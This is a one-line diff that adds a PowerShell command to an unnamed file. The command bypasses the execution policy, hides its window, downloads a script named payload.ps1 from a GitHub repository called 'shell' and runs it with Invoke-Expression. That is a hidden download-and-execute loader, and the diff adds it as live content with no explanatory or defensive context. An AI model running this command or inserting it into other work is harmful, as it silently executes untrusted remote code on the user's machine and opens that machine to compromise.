@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$run = Invoke-WebRequest -Method Get 'https://raw.githubusercontent.com/Mood56467/shell/main/payload.ps1' | Select-Object -Expand Content; Invoke-Expression -Command $run"
